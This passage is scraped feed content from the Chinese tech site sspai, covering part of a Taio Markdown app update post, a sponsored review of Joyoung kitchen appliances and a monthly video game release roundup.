是以移动端体验为主的移植应用，我们还是为其 Mac 版本做了相当多的优化，包括交互方式的改进和与 Mac 系统更好地集成。</p>\n<h3>编辑菜单</h3>\n<p>与移动端不同的是，在 Mac 上我们没有固定位置的输入栏，这也就无法借由其实现 Markdown 编辑菜单。为了解决这个问题，我们引入了浮动的菜单，它会在选择文字或点击屏幕的时候动态出现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/1d4ab14f018377e8b2cd805882781a4a.png\"><figcaption>编辑菜单</figcaption></figure><h3>文字宽度调整</h3>\n<p>考虑到 Mac 上显示器分辨率的可变范围很大，Taio 将允许用户调整文字可读宽度所占屏幕的比例。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/ecfc2f037120f6604760bda3a97a5c5e.png\"><figcaption>可读宽度调整</figcaption></figure><h3>更方便的外观调整</h3>\n<p>我们为 Mac 版本引入了基于系统菜单的外观调整，可以调整深色模式和文字可读宽度，并且支持键盘快捷键。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/ee9f115afbfdec8701399d049a9cc3f7.png\"><figcaption>外观调整</figcaption></figure><h3><strong>与 Mac 系统的集成</strong></h3>\n<p>与 iPad 版本一样，更开放、更好地与系统集成始终是我们的宗旨之一。您可以在访达定位 Taio 的文件，也可以在访达通过 Taio 打开文件，甚至是将 Taio 设置为 Markdown 文件的默认处理程序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/cd39225915fd95c5279a5b14ce1246f8.png\"><figcaption>在访达中找到</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/132072e2b56cba3e6c70b243365e743b.png\"><figcaption>默认使用 Taio 打开</figcaption></figure><h3>支持快捷指令</h3>\n<p>如果您在使用 macOS Monterey 的 Beta 版本，您会发现 Taio 已经完全支持了 Monterey 上的快捷指令应用，体验和 iOS 版本完全一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/dddac5038c44e15d7c9d1f5e7aaff7b5.png\"><figcaption>快捷指令</figcaption></figure><h2>近期新功能</h2>\n<p>过去的半年，我们除了移植 macOS 版本，也没有停下来开发新的功能。考虑到篇幅问题，本文仅介绍我们认为最重要的一些变化。</p>\n<h3>支持脚注和文本高亮</h3>\n<p>这两个特性并非 Markdown 标准语法，但在用户反馈里面呼声很高。您现在可以使用 <code>[^1]</code> 或 <code>[^note]</code> 来实现脚注，使用 <code>==text==</code> 来实现文本高亮。</p>\n<h3>对文本识别的支持</h3>\n<p>基于 Apple 的最新技术，我们增加了用于从图片中识别文本的新动作。如果使用 iOS 15，也支持了从摄像头输入文本的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/8dbbcce18821119e6ea2ae438a188a23.png\"><figcaption>文字识别动作</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/12d494f1ea12134f181a0de6f1dfd9e6.png\"><figcaption>扫描文本</figcaption></figure><h3>更多导出格式</h3>\n<p>除了导出为 PDF 和网页等格式，最新版本也支持了导出为 RTF 或 Microsoft Word 等格式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/d21baeec482e8fd2a8b504e341c910fe.png\"><figcaption>更多导出格式</figcaption></figure><h3>新的文本动作</h3>\n<p>为了更好地构建文本工作流，我们新增了一些处理文本的动作，例如查找文本的位置、选择文档等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/db95c4729c4a17d946c88931f0f96278.png\"><figcaption>新的文本处理动作</figcaption></figure><h3>更好的 wiki 链接支持</h3>\n<p>基于用户反馈，我们增强了对 wiki 链接 的支持，例如支持通过 <code>![[Image]]</code> 格式预览图片，并增加了显示链接引用关系的视图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/f511846e35f943a0d0412a0529169024.png\"><figcaption>网络视图</figcaption></figure><h3>实时光标位置</h3>\n<p>为了更好地反应当前位置，Taio 现在会在编辑区域右下角实时显示当前的行列和选中长度，也可以点击它来快速跳转。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/1f644c40fb3393929ac33d14edf09f3a.png\"><figcaption>光标位置和快速跳转</figcaption></figure><h3>增强对 URL scheme 的支持</h3>\n<p>URL scheme 系统可以很好地将 Taio 和其他效率应用联系起来，我们增强了这部分的支持。例如，现在您可以直接打开某个文件为预览模式。</p>\n<pre class=\"language-null\"><code>taio://editor?action=open&amp;path=Example.html&amp;location=0</code></pre>\n<p>支持了打开任意路径的文件，包括添加的文件书签位置。</p>\n<p>此外，也支持了通过 <code>x-callback-url</code> 协议来讲结果返回给调用的应用。</p>\n<pre class=\"language-plaintext hljs\"><code>taio://x-callback-url/actions?action=run&amp;name=name&amp;x-success=successURL&amp;x-error=errorURL&amp;x-cancel=cancelURL</code></pre>\n<h3>全新的编辑器主题、可选应用配色</h3>\n<p>基于「更可读」的考虑，我们为 Taio 设计了全新的 Taio Light 和 Taio Dark 主题，看起来更现代。此外，您也可以更改应用的主题配色了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/138e17c498aea117e9477a4358525796.png\"><figcaption>新的编辑器主题</figcaption></figure><h3>更多的可定制项</h3>\n<p>Taio 一直以「一切皆可定制」作为口号之一，我们也在最近增强了这个部分。现在您不仅可以定制粗体、斜体和列表所使用的语法符号，还可以设置默认使用的资源目录名称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c960153efd2be6af5e3312b80ec7837f.png\"><figcaption>更多自定义选项</figcaption></figure><h3>繁体中文支持</h3>\n<p>这也是一个用户反馈中呼声较高的需求，我们一直没有支持是因为我们执着地认为习惯用语的差异很难把握。</p>\n<p>在最新版本里面，我们基于 <a href=\"https://github.com/BYVoid/OpenCC\"><u>OpenCC</u></a> 项目转换了项目中大部分的文本，使用台湾地区的词汇表做了常见的习惯用语替换，并对明显不合理的转换做了修复。</p>\n<p>很难说这是一个高质量的版本，也欢迎提交关于这部分的问题反馈。</p>\n<h3>持续的无障碍投入</h3>\n<p>熟悉我们产品的朋友应该知道，对无障碍的极致追求是我们一直以来的目标。在过去的一段时间，我们也一直在收到无障碍相关的反馈，包括 iOS 版本和 macOS 版本。我们进一步地解决了这些问题，哪怕影响面不是那么广。在此也欢迎无障碍用户持续反馈遇到的问题，以便于我们打造一款完全无障碍的产品。</p>\n<h2>未来计划</h2>\n<p>Taio 的 Mac 版本已经上线，至此我们已经实现了 Apple 平台的全设备支持，这是一个重要的里程碑。我们非常幸运地参与到了 Apple 平台互相融合的进程中，也希望大家喜欢。</p>\n<p>在之后可预见的日子里，我们将会对 iPad 版本的界面做一些改造，使其更符合 Apple 平台的最新实践。而这些计划中的变化，也将是优化 macOS 版本的一个重要部分。</p>\n<p>欢迎在评论区说说你对 Taio 的看法和建议，本周五 (08.13) 选取 5 位读者送出 Taio 年订阅兑换码。</p>\n<span class=\"ss-application\" app-id=\"15830\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68179"},{"title":"国物馆 | 更有烟火气的日常，是我用了这几款九阳","date":"2021-08-10 07:38:11","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>从校园到职场，从租房到拥有自己的小家，从结婚生子，一路走来，我购置了不少大件也攒下了不少的小件。在这些大件、小件当中，我感觉最能提升品质、最能发挥个人能动性的非小家电莫属。尤其是在租房的时候，小家电更能将个人的主观能动性体现的淋漓尽致，因为租房留给租客自身调整的余地并不大。</p>\n<p>小家电的体积不大，可从容携带；其价格往往并不太高，遇到搬家时送人或者丢弃都不心疼；而更为关键的是它关系到饮食起居，方寸之间便可提升生活质量……诸多的优点让我「不惜血本」在小家电上进行投资。</p>\n<p>用过的小家电有很多，但是细数下来我发现日常陪伴我的品牌总是那么几个，这当中有一个品牌出现的几率特别高——那就是九阳。我使用过它的不少产品。</p>\n<blockquote><p>说明：文中提到的产品均是我本人自行购买。题图及标识来自于九阳官网。</p></blockquote>\n<p>话分两头。1934年，冯玉祥到烟台参观民族实业，当时感慨「装置既辉煌，机件又灵巧，谁说国货没有洋货好？」。如今，黄海洪波依旧涌起，却换了人间。而国货也随着时代发展向前。乘势而为，1994 年，同处这片土地之上的栖霞人王旭宁发明了 <a href=\"http://paper.dzwww.com/shrb/content/20110220/Articel02004MT.htm\" target=\"_blank\">世界上第一台豆浆机 </a>。由是，九阳开始起步。</p>\n<p>对于中国的小家电来讲，九阳可能是一个绕不开的坎儿。从 1994 年发明<a href=\"http://scitech.people.com.cn/n/2013/1118/c1057-23568474.html\" target=\"_blank\">第一台豆浆机</a>开始，九阳几乎「一手推动了豆浆机从一个产品发展为一个产业」。小小的一台豆浆机背后其实是无穷的智慧。在豆浆机发明的同时，王旭宁向山东省知识产权局申请了豆浆机历史上第一项发明专利——智能加热技术。「1999年，王旭宁的智能型家用全自动豆浆机获得国家发明专利。 2000年，他的豆浆制备办法及主动豆浆机再次获得国家创造专利。」这些围绕着豆浆机的的诸多专利构成了一道护城河。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/78ad4962ad82b945eec0be0007084631\"><figcaption>那些年，我买过的豆浆机</figcaption></figure><p>对于我来讲，第一次接触到九阳这个牌子也正是从豆浆机开始。2011 年，我购买了第一台豆浆机；2014 年，我购买了第三台九阳豆浆机。如今这些曾经为我服务过的机器虽然已经送人，但是九阳之路却并没有就此止步。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/2651832f263c5f90d880aa981c456e9e\"><figcaption>「图片与实物均来源于京东」</figcaption></figure><p>其实相比豆浆机，更让人难以忘怀的回忆是这样的：每个同学抽屉里几乎总藏有几个热得快（部分同学叫「烧水棒」），这是与宿管大妈/大爷斗智斗勇的硕果仅存；而每一个开始独立讨生活的人总是少不了这样一把跨越时空的经典版烧水壶。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/8d16ba479c48f41036efb1fe3f4cd16c\"><figcaption>「经典款烧水壶，图片来自于京东，实物现在老家了」</figcaption></figure><h2>水龙头前置净水机</h2>\n<p>一句「多喝热水」折射出世间百态，一滴水折射出生活的色彩斑斓。水的重要性不言而喻。由水（壶）及水（净水机）。我自己也一直很关注饮食用水的问题。九阳的水龙头前置净水机从我租房的时候起我就开始使用了，当时使用的是 T03 龙头净水器；如今换了更萌的 Line Friends 联名款。</p>\n<blockquote><p>严格的讲前置净水机算不上什么小家电，但是它与文中提到的其他小家电的性质相似，所以也填列其中。</p></blockquote>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/64b574857920f2220bc9488e41dd042a\"><figcaption>我先后使用过的两款前置净水机，左为 T03 龙头净水器，右边为Line Friends 联名款。图片来自于京东</figcaption></figure><p>前置净水机比较小巧，价格适中。这种小装置安装简单，租房的时候可以自行安装在水龙头上，不用「大兴土木」。即便是一个小女生安装起来也没有什么压力。安装的过程中，几乎不需额外工具，拧到水龙头上就可以使用。它们都是直接使用自来水本身的压力「驱动」，不需要额外用电，也不产生废水。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/article/d3917eb58bd618e1206634ffc4a7654b\"><figcaption>九阳 Line Friends 联名款净水器JYW-RT521XL</figcaption></figure><p>在功能上，九阳 JYW-RT521XL 前置净水机提供了「净水」、「原水」两档可供选择。「净水」采用了陶瓷活性炭滤芯过滤，能够减少自来水中的余氯或者其他异味；即便是使用了「原水」也可滤除一部分泥沙铁锈。图中滤网上能够能够看到「原水」档过滤后留存的小沙子。两档水流的强弱有所不同，前者水流较缓；后者水流比较湍急，而且比水龙头自身的水流有所打散。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/a8a9152b41de490ab3614c916a3220db\"></figure><p>日常中，我结合「净水」、「原水」两档的特性对用途进行了区分。「净水」我主要用来淘米、洗菜、给食材焯水，「原水」主要用来刷碗、洗刷菜板等。至于日常的饮食用水，比如炖菜、煮饭，我用的是我们当地鲁花的桶装水。</p>\n<p>写在最后，九阳 JYW-RT521XL前置净水机毕竟是只是一个前置的净水机，所以请不要拿它和大型的净水设备相比。</p>\n<h2>九阳复古电饭煲 F131（家用迷你电饭煲）</h2>\n<p>除了水之外，接下来维系一个人饮食起居的可能就是一日三餐了。在这当中，米饭应有一席之地。因之，电饭煲成为居家必备。</p>\n<p>关于电饭煲，我的主张是：既要颜值在线，又要节约粮食不浪费，还要功能多样。所以，在这个时候，我选择了九阳的这款国风复古电饭煲 F131。 F131 的外观非常讨喜，尤其是前面的那个小按钮，方形的外观也比较可爱，提手便于搬动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/4d740de6774da27fc1d006c5ed521d90\"></figure><p>选择 F131 最开始的出发点其实是因为之前使用的大电饭煲容量太大，煮了米饭之后经常会吃不完。而 F131 的大小刚刚好。它的容量比较小，规格为 2L 及以下。这个规格比较适合像我家这种吃不动饭的三口之家。在日常使用中，我对它的这个容量很满意。做一次米饭，一顿饭就可以吃的干净，不剩下。</p>\n<p>除了日常蒸煮米饭之外，F131 还有这样的一些功能：寿司饭、快速饭、柴火饭、热饭、煮粥、蛋糕、杂粮等等。</p>\n<h2>九阳 KL-26J601 空气炸锅</h2>\n<p>九阳 KL-26J601 空气炸锅是我日常中比较喜欢、也比较常用的一件小家电。具体的购置时间早已经记不清了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/fe99687ab5dc3d6a344056b84828d7b8.png\"></figure><p>在日常的使用中，我发现空气炸锅有这样几个优点。空气炸锅的操控比较简单，基本上就是食材放入之后，设定温度，设定时间，然后等着吃就可以。全程几乎不需要人工干预，也不需要预热。比如像鸡翅这样一些含油的食材，可以丢进去直接烤；而像杏鲍菇、花菜这些含油量低乃至不含油的食材，用刷子刷几下油就可以进行烤制了。再一个，空气炸锅利用热风产生的热对流与热循环给食物加热，食物受热更均匀。同样的食材，用空气炸锅来烹饪需要的时间更短。相形之下，烤箱的操作就要麻烦一些。除了操作简单之外，空气炸锅的后续清洁也比较方便，比烤箱要好。所以自从有了它之后，家里的烤箱处于吃灰状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/article/3061a469f0d07bc3a11225a596b3eb81\"><figcaption>空气炸锅很简单的设定功能</figcaption></figure><p>当然与烤箱相比，空气炸锅的可用面积比较小，一次性处理不了太多的食材，这也是它的缺点。不过，使用方便对我而言就足够了，毕竟空间不够可以用次数来凑。</p>\n<p>日常中我用空气炸锅烤过各种各样的东西，比如孩子比较喜欢吃的烤鸡翅、烤排骨、炸薯条，我也用它烤过杏鲍菇、烤过花菜。身在烟台，每年冬天还有一样必不可少的好物——烤地瓜。烟薯 25 那是必须的，稍微那么一烤就可以流油。</p>\n<h2>九阳 JYN-L12 立式全自动面条机</h2>\n<p>饮食总是需要调节一下的，每天三顿米饭之余，面条可以有。然而，如今在家里吃一碗面，尤其是手擀面，并不是一件容易的事情。</p>\n<p>从和面、揉面、到擀面条以及后续的切削，一份看似简单的手擀面充满了技术含量。就拿切削来讲，把一张擀好的面饼切成粗细均匀的面条也是很考验刀工。所以每次动手自己做面条的时候，总是会想起妈妈那嫌弃的眼神。而另一面，传统的面条制作往往需要一块很大的案板。正如你所看到的，我是用厨房切菜的菜板勉力为之。本身居住空间极为有限，厨房的面积就更为狭小，这对传统面条技法的传承是一个极大的挑战；有心想做，而场地受限。</p>\n<p>这些原因叠加在一起导致擀面条这门传统艺能正在逐渐「失传」。想一饱口福，难！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/ac507c5bc7f77efced5d254aac13bb4f.png\"><figcaption>自己用菜板凑合的手擀面，馄饨皮也是同样手法，最后出来的是四方片</figcaption></figure><p>在解决口腹之欲的过程中，我发现了九阳全自动面条机这么个好东西。相对来讲，九阳 JYN-L12 立式全自动面条机比较好解决了我上面提到的痛点。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/25/0cbecd05bdf42d4d1f767d4d2267c41d.gif\"><figcaption>从揉面到出面条一气呵成</figcaption></figure><p>首先它占地面积比较小，不必纠结为「大案板」找一个合适的存放之处。九阳 JYN-L12 面条机自动和面，比较干净，也不会弄脏手。只需要按配比加水、加面粉即可。由此我也基本上告别了「和泥巴」式揉面。</p>\n<p>最为关键的是九阳 JYN-L12 面条机的功能比较强大。不管是粗面还是细面，不管是宽面还是窄面，它都可以从容应对；面条的软硬程度也可以调节。处在一个几乎逢节就吃饺子的地方，饺子皮也是必不可少的。这一点面条机也并未让我失望。</p>\n<p>凡此种种，上面提到这些看似复杂的面食，其实所需要做的仅仅是更换模具而已。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/25/c5731d7b3ab8693e92a6f2c32c560192.png\"><figcaption>随机附带的各种面条的模具，其中金属模具是做饺子皮的</figcaption></figure><p>作为家长，很多人可能都会遇到这样的场景：在孩子小的时候，为了让孩子吃饭家长费劲了心机。我也不例外。利用这款面条机，我给我家孩子弄过蔬菜面、做过鸡蛋面以及其他各种颜色的面条。整体而言，在有了面条机之后，我家的面食问题基本上得以解决。</p>\n<h2>最日常的陪伴</h2>\n<p>上面提到的这些产品只是我日常用到的一部分，它们较好的解决了我的痛点，让我的生活更具烟火气。除了九阳之外，我在日常生活之中也使用了一些其他的品牌的小家电、小产品，比如苏泊尔、奔腾。生活千姿百态，每个人的诉求也各不相同。我欣喜地发现，在越来越多人的生活当中有着越来越多的国产品牌。这些品牌改善了和改善着我们的生活品质，每一个品牌都在不断的发力。而我也有一个小期待——未来是不是会出现颠覆性的小家电呢？</p>\n","link":"https://sspai.com/post/67669"},{"title":"本月玩什么 | 人类、十二分钟、永劫无间、对马岛之魂导演剪辑版","date":"2021-08-10 06:26:18","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>欢迎来到<strong>「本月玩什么」</strong>，本栏目将从作者个人角度出发，为大家挑选、简介本月新发售的部分游戏作品/内容，主要涵盖 PlayStation、Xbox、Nintendo、PC 和 iOS/Android 等主流平台，期待里面有能勾起你兴趣的好玩意儿，也真诚感谢所有喜欢本栏目的朋友。</p>\n<p>本栏目设有<strong>有奖互动</strong>环节，详情依旧请看文末。</p>\n<h2><strong>人类 / HUMANKIND</strong></h2>\n<blockquote><p>4X 玩法新势力，主打不同阶段、不同人类文明的排列组合。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.18</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/320e7b2caf3b6e6313d2a4885e90994e.jpg\"></figure><p>世嘉发行、AMPLITUDE Studios 制作的 4X 游戏（即 eXplore/探索、eXpand/扩张、eXploit/开发、eXterminate/征服），原定今年 4 月发售，但开年的 OpenDev 测试反馈让开发团队看到了进一步优化的必要，所以延期至今。</p>\n<p>如果我们把《文明》系列抽取、运用文明势力历史特征的手法叫做「戏说不是胡说」，那也许就可以把《人类》干的事情戏称为「改编就是胡编」——虽然两者的 4X 玩法框架接近，但《人类》强调糅合不同文明特征、形成「缝合怪」一样的原创文明，具体做法是允许玩家在时代更替时选择迥异于现有文明的「未曾设想的道路」，完全可以安排出类似「原始部落→周朝→罗马帝国→封建君主制西班牙→……」的奇怪发展路径，一切全看玩家喜好。</p>\n<p>除了「文明嫁接」这个金字招牌外，《人类》还有很多区别于主要竞品的特色机制设计，对笔者个人来说，之前的测试中印象最深的莫过于爽快的战斗，玩家可以集结包含数十个军事单位的大型军团，在地图生成的战区里进行战役，战役会暂时掐断生产经营活动，让玩家专注于战斗回合、仗打完了再回到正轨上搞经济。其他特色设计还有很多，在此不一一赘述，而且也确实不知道开发团队根据民意又做了什么大调整，总之，我们应该可以期待本月的这部杀时间幻想巨制。</p>\n<p>特别再介绍一下笔者偏爱的制作团队 AMPLITUDE Studios，这是一家法国知名游戏开发商，创立于 2011 年、两名创始人均出身于育碧（其中一位已离职再创业），2016 年被世嘉收购，与 Creative Assembly、Two Point 等共同隶属于世嘉欧洲。该团队最拿手的游戏品类无疑正是 4X，旗下已有《无尽帝国（Endless Legend）》《无尽宇宙（Endless Space）》等当家花旦，往往以巧夺天工的美术设计、沉迷度较高的玩法闻名于玩家社群。</p>\n<h2><strong>十二分钟 / Twelve Minutes</strong></h2>\n<blockquote><p>悬念感十足的「时间牢笼」逃脱记。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.19</li>\n<li>登陆平台：X1、XS S/X、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/5fc624c7056ab59cc146a2394d714347.jpg\"></figure><p>这部游戏进入绝大多数玩家视野应该是在 2019 年的微软 E3 展前发布会上，这也是笔者对《十二分钟》一见钟情的时刻。每当我看到《十二分钟》的演示片段，都免不了会回想起深刻影响了本作的斯坦利·库布里克（Stanley Kubrick）、阿尔弗雷德·希区柯克（Alfred Hitchcock）、大卫·芬奇（David Fincher）等，以及自己一直酷爱的各种「密室逃脱」题材作品。</p>\n<p>本作的设计概念简洁明了：玩家将俯瞰一座狭小的公寓，控制一位刚进家门的丈夫，现在给你 12 分钟时间，几分钟后会有特勤人员模样的人破门而入，将你和在家的妻子绑在地上，一旦 12 分钟结束或者丈夫死亡，时间就会回溯到丈夫进家门的时刻，但之前的记忆都会保留，也就允许丈夫在对话中引用自己的「跨时空经历」，游戏的最终目的也就是想办法打破 12 分钟的时间循环魔咒。</p>\n<p>从宣传披露的内容来看，《十二分钟》刺激体验的核心应该是交互与推理：在自由活动时间里，玩家可与家具、电器、锅碗瓢盆等房间内几乎一切物品互动，还能组合拾取的物品、拿身上的物品与其他东西互动等（比如拿杯子去接水、拿刀自卫等等）；当然更重要的是，玩家可以与妻子为主的各个 NPC 对话，尝试证实时间回溯的存在，或是套取关键信息，努力反转几分钟之后的命运。按照通常的经验，这种玩法往往很考验悬疑、台词、交互等方面的逻辑严密性，如果能在这些核心环节有上佳表现，《十二分钟》将极富吸引力。</p>\n<p>这个游戏项目的发起者名叫 Luis Antonio，是一位有 Rockstar、育碧工作经历的艺术家、开发者，本作是他入行独立游戏后构思的第一作；早在 2015 年，Antonio 就将本作的 Demo 带到了 PAX East 展会，原计划次年发售，不知道他和有眼光的发行商谁先动的手，总之，本作撤销了原定的上市计划，制作规模大幅扩张，最终成为了 Annapurna Interactive 担任发行、饱受微软青睐的旗舰作品，更是靠发行商牵线，请到了詹姆斯·麦卡沃伊（James McAvoy，《X 战警》等）、黛茜·雷德利（Daisy Ridley，《星球大战：原力觉醒》等）、威廉·达福（Willem Dafoe，《蜘蛛侠》等）为主角配音，可谓声势浩大。是否能名副其实，这个月终于能拉出来溜溜了。</p>\n<h2><strong>永劫无间 / Naraka: Bladepoint</strong></h2>\n<blockquote><p>仙侠题材「大逃杀」作品，拥有畅快的冷兵器拼杀体验。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.12</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/4f368933f92cd3ae0830673e40728d7f.jpg\"></figure><p>可能有很多朋友已经忘了，本作最早是在 TGA 2019 上正式公开的，一段概念性有点强的预告片过后，包括笔者在内的很多人估计就只留下了一个印象：有点像劣化版的《只狼》，又有大厂要「顶风作案」了。</p>\n<p>当然，后来我们都知道了，这是一部由网易发行、24 Entertainment 工作室研发的「大逃杀」类多人竞技游戏，领衔该工作室的关磊曾担任过《流星蝴蝶剑.net》（2002）动作设计、《新流星搜剑录》（2015）制作人、移动版《流星蝴蝶剑》（2018）主策划等职，很显然，《永劫无间》将是他在相似玩法领域中的一次全新尝试。</p>\n<p>实机体验过后，个人认为，在「大逃杀」产品多如牛毛、层出不穷的市场环境下，本作打拼地位的努力确实可圈可点，某种程度上也算是「学贯中西」：</p>\n<ul>\n<li>游戏整体框架的层面，能看出本作从《Apex 英雄》《绝地求生》等最主流的「大逃杀」产品中吸取了大量成熟经验，尤其能在战场规模、界面交互设计中看到浓重的《Apex 英雄》痕迹，运转起来简明、高效。</li>\n<li>题材层面，和细分市场上已有的强力竞品相比——就拿方块游戏发行的《武侠乂》来说，虽然同样都是在「中国传统武打」上做文章，《武侠乂》偏写实，包含了趣味且高度复杂的招式系统，《永劫无间》则偏重运用「仙侠神魔」等超现实要素，后者也因此将视听表现做得炫目多彩。</li>\n<li>玩法层面，虽然游戏中不乏长枪短炮，但处于玩法核心的依然是冷兵器的碰撞，开发团队加入了长剑、太刀、棍等一批有代表性的武器及动作模组（且在持续扩张），并设计了高度精炼的「普攻、霸体、振刀」这一「猜拳」决策，丰富了玩家短兵相接时的博弈，简约却不失策略性、爽快感。</li>\n</ul>\n<p>从<a href=\"https://www.zhihu.com/question/361077302/answer/1862792327\">制作人发表的开发感想</a>中可以发现，当前，开发团队对本作的后续开发工作保持了相当开放的态度，既认为自己走对了玩法的细分赛道，也乐于实施能提升体验的重大改动，游戏从早期倚重近身格斗、改到现在可以火器横飞，确实就是个很好的例证。基于此，笔者期待《永劫无间》正式上线后能继续维持好势头。</p>\n<h2><strong>对马岛之魂 导演剪辑版 / Ghost of Tsushima Director's Cut</strong></h2>\n<blockquote><p>内容更加充实，但不少玩家对定价模式颇有微词。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.20</li>\n<li>登陆平台：PS4、PS5</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/5fe9a76b4d0875e79c425b7f58e6910a.jpg\"></figure><p>《对马岛之魂》的豪华升级版，最引人瞩目的升级项目是增加了全新的《壹岐之章》，将玩家带到风景如画、却也危机四伏的壹岐岛（位于日本九州和对马岛之间），体验全新的地图、故事、物品搜集、敌人对抗等，此外还包含了之前已经推出的多人合作玩法「奇谈模式」，游戏内赠品若干。导演剪辑版为《对马岛之魂》带来了更原生的 PS5 平台体验，实现了最高 4K@60FPS 的画面表现、DualSense 触觉反馈及自适应扳机、3D 音效、日语配音口型同步等技术升级。</p>\n<p>《对马岛之魂 导演剪辑版》推出后顶替了原版游戏，现在购买的话，PS4、PS5 版分别定价 60、70 美元，已经有了 PS4 原版游戏的玩家也可以付费升级，9.99 美元升至 PS4 导演剪辑版、29.99 美元升至 PS5 版，存档可继承，需要特别提醒的是，主打组队对战玩法的「奇谈模式」预定于 9 月单独发售、定价 19.99 美元，总之感兴趣的玩家可以考虑自己接受的「套餐」。</p>\n<h2><strong>脑航员 2 / Psychonauts 2</strong></h2>\n<blockquote><p>视听体验奇妙，故事令人期待。</p></blockquote>\n<ul>\n<li>推出日期：2021.08.25</li>\n<li>登陆平台：PS4、Xbox（支持智能分发）、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/10/e9ba61499ce09a0390a4a4795282c575.jpg\"></figure><p>《脑航员》是一个非常精灵古怪的 3D 平台跳跃游戏系列，游戏的核心主题正如标题所指，玩家将一头扎入脑中世界，在五彩斑斓的各个区域展开冒险。该系列的开发商是现已隶属于 Xbox Game Studios 的第一方工作室 Double Fine Productions，制作系列初代时，该团队就曾受到过微软的扶持。</p>\n<p>开发团队曾在<a href=\"https://www.well-played.com.au/double-fines-lisette-titre-montgomery-and-tim-schafer-on-returning-to-the-world-of-psychonauts/\">近期的访谈</a>中提到，《脑航员》系列初代受定格动画《圣诞夜惊魂（The Nightmare Before Christmas）》的影响颇深，而该片的核心主创蒂姆·波顿（Tim 